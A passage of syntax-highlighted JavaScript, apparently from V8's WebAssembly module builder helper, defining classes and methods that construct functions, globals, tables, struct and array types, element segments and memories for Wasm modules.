    <span class="hljs-variable language_">this</span>.<span class="hljs-property">locals</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">local_names</span> = arg_names;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">body_offset</span> = <span class="hljs-literal">undefined</span>;  <span class="hljs-comment">// Not valid until module is serialized.</span>
  }

  <span class="hljs-title function_">numLocalNames</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">let</span> num_local_names = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> loc_name <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">local_names</span>) {
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> loc_name == <span class="hljs-string">&#x27;string&#x27;</span>) ++num_local_names;
    }
    <span class="hljs-keyword">return</span> num_local_names;
  }

  <span class="hljs-title function_">exportAs</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">module</span>.<span class="hljs-title function_">addExport</span>(name, <span class="hljs-variable language_">this</span>.<span class="hljs-property">index</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">exportFunc</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">exportAs</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">addBody</span>(<span class="hljs-params">body</span>) {
    <span class="hljs-title function_">checkExpr</span>(body);
    <span class="hljs-comment">// Store a copy of the body, and automatically add the end opcode.</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">body</span> = body.<span class="hljs-title function_">concat</span>([kExprEnd]);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">addBodyWithEnd</span>(<span class="hljs-params">body</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">body</span> = body;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">getNumLocals</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">let</span> total_locals = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> l <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">locals</span>) {
      total_locals += l.<span class="hljs-property">count</span>
    }
    <span class="hljs-keyword">return</span> total_locals;
  }

  <span class="hljs-title function_">addLocals</span>(<span class="hljs-params">type, count, names</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">locals</span>.<span class="hljs-title function_">push</span>({<span class="hljs-attr">type</span>: type, <span class="hljs-attr">count</span>: count});
    names = names || [];
    <span class="hljs-keyword">if</span> (names.<span class="hljs-property">length</span> &gt; count) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;too many locals names given&#x27;</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">local_names</span>.<span class="hljs-title function_">push</span>(...names);
    <span class="hljs-keyword">if</span> (count &gt; names.<span class="hljs-property">length</span>) <span class="hljs-variable language_">this</span>.<span class="hljs-property">local_names</span>.<span class="hljs-title function_">push</span>(count - names.<span class="hljs-property">length</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">end</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">module</span>;
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">WasmGlobalBuilder</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-variable language_">module</span>, type, mutable, shared, init</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">module</span> = <span class="hljs-variable language_">module</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = type;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">mutable</span> = mutable;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">shared</span> = shared;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">init</span> = init;
  }

  <span class="hljs-title function_">exportAs</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-title function_">push</span>(
        {<span class="hljs-attr">name</span>: name, <span class="hljs-attr">kind</span>: kExternalGlobal, <span class="hljs-attr">index</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">index</span>});
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">checkExpr</span>(<span class="hljs-params">expr</span>) {
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> b <span class="hljs-keyword">of</span> expr) {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> b !== <span class="hljs-string">&#x27;number&#x27;</span> || (b &amp; (~<span class="hljs-number">0xFF</span>)) !== <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(
          <span class="hljs-string">&#x27;invalid body (entries must be 8 bit numbers): &#x27;</span> + expr);
    }
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">WasmTableBuilder</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-variable language_">module</span>, type, initial_size, max_size, init_expr, is_shared, is_table64</span>) {
    <span class="hljs-comment">// TODO(manoskouk): Add the table index.</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">module</span> = <span class="hljs-variable language_">module</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = type;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">initial_size</span> = initial_size;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">has_max</span> = max_size !== <span class="hljs-literal">undefined</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">max_size</span> = max_size;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">init_expr</span> = init_expr;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">has_init</span> = init_expr !== <span class="hljs-literal">undefined</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_shared</span> = is_shared;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_table64</span> = is_table64;
  }

  <span class="hljs-title function_">exportAs</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-title function_">push</span>(
        {<span class="hljs-attr">name</span>: name, <span class="hljs-attr">kind</span>: kExternalTable, <span class="hljs-attr">index</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">index</span>});
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">makeField</span>(<span class="hljs-params">type, mutability</span>) {
  <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">typeof</span> mutability) != <span class="hljs-string">&#x27;boolean&#x27;</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;field mutability must be boolean&#x27;</span>);
  }
  <span class="hljs-keyword">return</span> {<span class="hljs-attr">type</span>: type, <span class="hljs-attr">mutability</span>: mutability};
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">MustBeNumber</span>(<span class="hljs-params">x, name</span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> x !== <span class="hljs-string">&#x27;undefined&#x27;</span> &amp;&amp; <span class="hljs-keyword">typeof</span> x !== <span class="hljs-string">&#x27;number&#x27;</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`<span class="hljs-subst">${name}</span> must be a number, was <span class="hljs-subst">${x}</span>`</span>);
  }
  <span class="hljs-keyword">return</span> x;
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">WasmStruct</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">fields, is_final, is_shared, supertype_idx</span>) {
    <span class="hljs-keyword">let</span> descriptor = <span class="hljs-literal">undefined</span>;
    <span class="hljs-keyword">let</span> describes = <span class="hljs-literal">undefined</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(fields)) {
      <span class="hljs-comment">// Fall through.</span>
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fields.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Object</span>) {
      <span class="hljs-comment">// Options bag.</span>
      is_final = fields.<span class="hljs-property">is_final</span> ?? fields.<span class="hljs-property">final</span> ?? <span class="hljs-literal">false</span>;
      is_shared = fields.<span class="hljs-property">is_shared</span> ?? fields.<span class="hljs-property">shared</span> ?? <span class="hljs-literal">false</span>;
      supertype_idx = <span class="hljs-title class_">MustBeNumber</span>(
          fields.<span class="hljs-property">supertype_idx</span> ?? fields.<span class="hljs-property">supertype</span> ?? kNoSuperType,
          <span class="hljs-string">&quot;supertype&quot;</span>);
      descriptor = <span class="hljs-title class_">MustBeNumber</span>(fields.<span class="hljs-property">descriptor</span>, <span class="hljs-string">&quot;&#x27;descriptor&#x27;&quot;</span>);
      describes = <span class="hljs-title class_">MustBeNumber</span>(fields.<span class="hljs-property">describes</span>, <span class="hljs-string">&quot;&#x27;describes&#x27;&quot;</span>);
      fields = fields.<span class="hljs-property">fields</span> ?? [];  <span class="hljs-comment">// This must happen last.</span>
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;struct fields must be an array&#x27;</span>);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fields</span> = fields;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type_form</span> = kWasmStructTypeForm;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_final</span> = is_final;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_shared</span> = is_shared;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">supertype</span> = supertype_idx;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">descriptor</span> = descriptor;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">describes</span> = describes;
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">WasmArray</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">type, mutability, is_final, is_shared, supertype_idx</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = type;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">mutability</span> = mutability;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type_form</span> = kWasmArrayTypeForm;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_final</span> = is_final;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_shared</span> = is_shared;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">supertype</span> = supertype_idx;
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">WasmCont</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">type_index</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type_index</span> = type_index;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">supertype</span> = kNoSuperType;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_final</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_shared</span> = <span class="hljs-literal">false</span>;
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">WasmElemSegment</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">table, offset, type, elements, is_decl, is_shared</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">table</span> = table;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">offset</span> = offset;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = type;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span> = elements;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_decl</span> = is_decl;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_shared</span> = is_shared;
    <span class="hljs-comment">// Invariant checks.</span>
    <span class="hljs-keyword">if</span> ((table === <span class="hljs-literal">undefined</span>) != (offset === <span class="hljs-literal">undefined</span>)) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;invalid element segment&quot;</span>);
    }
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> elem <span class="hljs-keyword">of</span> elements) {
      <span class="hljs-keyword">if</span> (((<span class="hljs-keyword">typeof</span> elem) == <span class="hljs-string">&#x27;number&#x27;</span>) != (type === <span class="hljs-literal">undefined</span>)) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;invalid element&quot;</span>);
      }
    }
  }

  <span class="hljs-title function_">is_active</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">table</span> !== <span class="hljs-literal">undefined</span>;
  }

  <span class="hljs-title function_">is_passive</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">table</span> === <span class="hljs-literal">undefined</span> &amp;&amp; !<span class="hljs-variable language_">this</span>.<span class="hljs-property">is_decl</span>;
  }

  <span class="hljs-title function_">is_declarative</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">table</span> === <span class="hljs-literal">undefined</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_decl</span>;
  }

  <span class="hljs-title function_">expressions_as_elements</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> !== <span class="hljs-literal">undefined</span>;
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">WasmModuleBuilder</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">imports</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">exports</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">stringrefs</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">globals</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tables</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tags</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">memories</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">functions</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">element_segments</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data_segments</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">explicit</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">rec_groups</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">compilation_priorities</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">instruction_frequencies</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">call_targets</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">start_index</span> = <span class="hljs-literal">undefined</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_funcs</span> = <span class="hljs-number">0</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_globals</span> = <span class="hljs-number">0</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_tables</span> = <span class="hljs-number">0</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_tags</span> = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">addStart</span>(<span class="hljs-params">start_index</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">start_index</span> = start_index;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">addMemory</span>(<span class="hljs-params">min, max, shared</span>) {
    <span class="hljs-comment">// Note: All imported memories are added before declared ones (see the check</span>
    <span class="hljs-comment">// in {addImportedMemory}).</span>
    <span class="hljs-keyword">const</span> imported_memories =
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">imports</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">i</span> =&gt;</span> i.<span class="hljs-property">kind</span> == kExternalMemory).<span class="hljs-property">length</span>;
    <span class="hljs-keyword">const</span> mem_index = imported_memories + <span class="hljs-variable language_">this</span>.<span class="hljs-property">memories</span>.<span class="hljs-property">length</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">memories</span>.<span class="hljs-title function_">push</span>(
        {<span class="hljs-attr">min</span>: min, <span class="hljs-attr">max</span>: max, <span class="hljs-attr">shared</span>: shared || <span class="hljs-literal">false</span>, <span class="hljs-attr">is_memory64</span>: <span class="hljs-literal">false</span>});
    <span class="hljs-keyword">return</span> mem_index;
  }

  <span class="hljs-title function_">addMemory64</span>(<span class="hljs-params">min, max, shared</span>) {
    <span class="hljs-comment">// Note: All imported memories are added before declared ones (see the check</span>
    <span class="hljs-comment">// in {addImportedMemory}).</span>
    <span class="hljs-keyword">const</span> imported_memories =
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">imports</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">i</span> =&gt;</span> i.<span class="hljs-property">kind</span> == kExternalMemory).<span class="hljs-property">length</span>;
    <span class="hljs-keyword">const</span> mem_index = imported_memories + <span class="hljs-variable language_">this</span>.<span class="hljs-property">memories</span>.<span class="hljs-property">length</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">memories</span>.<span class="hljs-title function_">push</span>(
        {<span class="hljs-attr">min</span>: min, <span class="hljs-attr">max</span>: max, <span class="hljs-attr">shared</span>: shared || <span class="hljs-literal">false</span>, <span class="hljs-attr">is_memory64</span>: <span class="hljs-literal">true</span>});
    <span class="hljs-keyword">return</span> mem_index;
  }

  <span class="hljs-title function_">addExplicitSection</span>(<span class="hljs-params">bytes</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">explicit</span>.<span class="hljs-title function_">push</span>(bytes);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">stringToBytes</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-keyword">var</span> result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Binary</span>();
    result.<span class="hljs-title function_">emit_u32v</span>(name.<span class="hljs-property">length</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; name.<span class="hljs-property">length</span>; i++) {
      result.<span class="hljs-title function_">emit_u8</span>(name.<span class="hljs-title function_">charCodeAt</span>(i));
    }
    <span class="hljs-keyword">return</span> result.<span class="hljs-title function_">trunc_buffer</span>()
  }

  <span class="hljs-title function_">createCustomSection</span>(<span class="hljs-params">name, bytes</span>) {
    name = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">stringToBytes</span>(name);
    <span class="hljs-keyword">var</span> section = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Binary</span>();
    section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0</span>);
    section.<span class="hljs-title function_">emit_u32v</span>(name.<span class="hljs-property">length</span> + bytes.<span class="hljs-property">length</span>);
    section.<span class="hljs-title function_">emit_bytes</span>(name);
    section.<span class="hljs-title function_">emit_bytes</span>(bytes);
    <span class="hljs-keyword">return</span> section.<span class="hljs-title function_">trunc_buffer</span>();
  }

  <span class="hljs-title function_">addCustomSection</span>(<span class="hljs-params">name, bytes</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">explicit</span>.<span class="hljs-title function_">push</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">createCustomSection</span>(name, bytes));
  }

  <span class="hljs-comment">// We use {is_final = true} so that the MVP syntax is generated for</span>
  <span class="hljs-comment">// signatures.</span>
  <span class="hljs-title function_">addType</span>(<span class="hljs-params">type, supertype_idx = kNoSuperType, is_final = <span class="hljs-literal">true</span>,
          is_shared = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">var</span> pl = type.<span class="hljs-property">params</span>.<span class="hljs-property">length</span>;   <span class="hljs-comment">// should have params</span>
    <span class="hljs-keyword">var</span> rl = type.<span class="hljs-property">results</span>.<span class="hljs-property">length</span>;  <span class="hljs-comment">// should have results</span>
    <span class="hljs-keyword">var</span> type_copy = {<span class="hljs-attr">params</span>: type.<span class="hljs-property">params</span>, <span class="hljs-attr">results</span>: type.<span class="hljs-property">results</span>,
                     <span class="hljs-attr">is_final</span>: is_final, <span class="hljs-attr">is_shared</span>: is_shared,
                     <span class="hljs-attr">supertype</span>: supertype_idx};
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-title function_">push</span>(type_copy);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  }

  <span class="hljs-title function_">addLiteralStringRef</span>(<span class="hljs-params">str</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">stringrefs</span>.<span class="hljs-title function_">push</span>(str);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">stringrefs</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  }

  <span class="hljs-comment">// {fields} may be a list of fields, in which case the other parameters are</span>
  <span class="hljs-comment">// relevant; or an options bag, which replaces the other parameters.</span>
  <span class="hljs-comment">// Example: addStruct({fields: [...], supertype: 3})</span>
  <span class="hljs-title function_">addStruct</span>(<span class="hljs-params">fields, supertype_idx = kNoSuperType, is_final = <span class="hljs-literal">false</span>,
            is_shared = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-title function_">push</span>(
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmStruct</span>(fields, is_final, is_shared, supertype_idx));
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  }

  <span class="hljs-title function_">addArray</span>(<span class="hljs-params">type, mutability, supertype_idx = kNoSuperType, is_final = <span class="hljs-literal">false</span>,
           is_shared = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-title function_">push</span>(
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmArray</span>(type, mutability, is_final, is_shared, supertype_idx));
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  }

  <span class="hljs-title function_">addCont</span>(<span class="hljs-params">type</span>) {
    <span class="hljs-keyword">let</span> type_index = (<span class="hljs-keyword">typeof</span> type) == <span class="hljs-string">&#x27;number&#x27;</span> ? type : <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addType</span>(type);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmCont</span>(type_index));
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  }


  <span class="hljs-title function_">nextTypeIndex</span>(<span class="hljs-params"></span>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-property">length</span>; }

  <span class="hljs-keyword">static</span> <span class="hljs-title function_">defaultFor</span>(<span class="hljs-params">type</span>) {
    <span class="hljs-keyword">switch</span> (type) {
      <span class="hljs-keyword">case</span> <span class="hljs-attr">kWasmI32</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">wasmI32Const</span>(<span class="hljs-number">0</span>);
      <span class="hljs-keyword">case</span> <span class="hljs-attr">kWasmI64</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">wasmI64Const</span>(<span class="hljs-number">0</span>);
      <span class="hljs-keyword">case</span> <span class="hljs-attr">kWasmF32</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">wasmF32Const</span>(<span class="hljs-number">0.0</span>);
      <span class="hljs-keyword">case</span> <span class="hljs-attr">kWasmF64</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">wasmF64Const</span>(<span class="hljs-number">0.0</span>);
      <span class="hljs-keyword">case</span> <span class="hljs-attr">kWasmS128</span>:
        <span class="hljs-keyword">return</span> [kSimdPrefix, kExprS128Const, ...(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">0</span>))];
      <span class="hljs-keyword">case</span> <span class="hljs-attr">kWasmStringViewIter</span>:
      <span class="hljs-keyword">case</span> <span class="hljs-attr">kWasmStringViewWtf8</span>:
      <span class="hljs-keyword">case</span> <span class="hljs-attr">kWasmStringViewWtf16</span>:
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;String views are non-defaultable&quot;</span>);
      <span class="hljs-attr">default</span>:
        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">typeof</span> type) != <span class="hljs-string">&#x27;number&#x27;</span> &amp;&amp; type.<span class="hljs-property">opcode</span> != kWasmRefNull) {
          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Non-defaultable type&quot;</span>);
        }
        <span class="hljs-keyword">let</span> heap_type = (<span class="hljs-keyword">typeof</span> type) == <span class="hljs-string">&#x27;number&#x27;</span> ? type : type.<span class="hljs-property">heap_type</span>;
        <span class="hljs-keyword">return</span> [kExprRefNull, ...<span class="hljs-title function_">wasmSignedLeb</span>(heap_type, kMaxVarInt32Size)];
    }
  }

  <span class="hljs-title function_">addGlobal</span>(<span class="hljs-params">type, mutable, shared, init</span>) {
    <span class="hljs-keyword">if</span> (init === <span class="hljs-literal">undefined</span>) init = <span class="hljs-title class_">WasmModuleBuilder</span>.<span class="hljs-title function_">defaultFor</span>(type);
    <span class="hljs-title function_">checkExpr</span>(init);
    <span class="hljs-keyword">let</span> glob = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmGlobalBuilder</span>(<span class="hljs-variable language_">this</span>, type, mutable, shared, init);
    glob.<span class="hljs-property">index</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">globals</span>.<span class="hljs-property">length</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_globals</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">globals</span>.<span class="hljs-title function_">push</span>(glob);
    <span class="hljs-keyword">return</span> glob;
  }

  <span class="hljs-title function_">addTable</span>(<span class="hljs-params">
      type, initial_size, max_size = <span class="hljs-literal">undefined</span>, init_expr = <span class="hljs-literal">undefined</span>,
      is_shared = <span class="hljs-literal">false</span>, is_table64 = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">if</span> (type == kWasmI32 || type == kWasmI64 || type == kWasmF32 ||
        type == kWasmF64 || type == kWasmS128 || type == kWasmVoid) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Tables must be of a reference type&#x27;</span>);
    }
    <span class="hljs-keyword">if</span> (init_expr != <span class="hljs-literal">undefined</span>) <span class="hljs-title function_">checkExpr</span>(init_expr);
    <span class="hljs-keyword">let</span> table = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmTableBuilder</span>(
        <span class="hljs-variable language_">this</span>, type, initial_size, max_size, init_expr, is_shared, is_table64);
    table.<span class="hljs-property">index</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">tables</span>.<span class="hljs-property">length</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_tables</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tables</span>.<span class="hljs-title function_">push</span>(table);
    <span class="hljs-keyword">return</span> table;
  }

  <span class="hljs-title function_">addTable64</span>(<span class="hljs-params">
      type, initial_size, max_size = <span class="hljs-literal">undefined</span>, init_expr = <span class="hljs-literal">undefined</span>,
      is_shared = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addTable</span>(
        type, initial_size, max_size, init_expr, is_shared, <span class="hljs-literal">true</span>);
  }

